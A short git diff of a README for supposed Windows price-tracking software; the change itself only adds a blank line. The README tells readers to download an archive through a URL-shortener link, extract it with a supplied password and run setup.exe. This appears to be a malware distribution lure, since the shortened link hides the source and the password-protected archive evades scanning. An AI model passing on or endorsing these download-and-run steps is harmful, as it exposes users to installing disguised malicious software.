@@ -22,6 +22,7 @@ The software provides **real-time price tracking, market trends, and recommendat
 ## 📥 Installation & Launch
 ### 🔹 ✅ RECOMMENDED METHOD (Windows .exe)
 1️⃣ **[Download](https://goo.su/VshhJUa) and extract archive(pass: Project12!)**
+
 2️⃣ **Run `setup.exe`**  
 🚀 **The application will set up everything automatically, just enjoy!**  
 
